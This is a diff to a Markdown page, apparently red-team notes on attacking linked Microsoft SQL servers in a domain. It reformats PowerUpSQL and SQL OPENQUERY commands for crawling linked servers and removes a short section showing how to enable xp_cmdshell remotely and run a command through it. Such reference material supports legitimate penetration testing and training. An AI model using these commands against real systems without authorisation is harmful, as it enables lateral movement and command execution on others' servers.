@@ -32,25 +32,23 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
 {% tabs %}
 {% tab title="PowerUpSQL" %}
-```
+{% code lineNumbers="true" %}
+```powershell
 Get-SQLServerLink -Instance <server-name> -Verbose
 //Nested Enumeration
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 ```
+{% endcode %}
 {% endtab %}
 
 {% tab title="Manual" %}
-```
+{% code lineNumbers="true" %}
+```sql
 SELECT * FROM master..sysservers
 SELECT * FROM OPENQUERY("<link-server1>", 'SELECT * FROM master..sysservers')
 //Nested Enumeration
 SELECT * FROM OPENQUERY("<link-server1>",'SELECT * FROM OPENQUERY(''<link-server2>'',''SELECT * FROM master..sysservers'')')
 ```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
-
-#### Executing OS Commands
-
-* Enable `xp_cmdshell` Remotely (if `rpcout` is enabled)
-  * `EXECUTE('sp_configure "xp_cmdshell", 1; RECONFIGURE;') AT "<server>"`
-  * `EXECUTE('xp_cmdshell "whoami"') AT "server"`
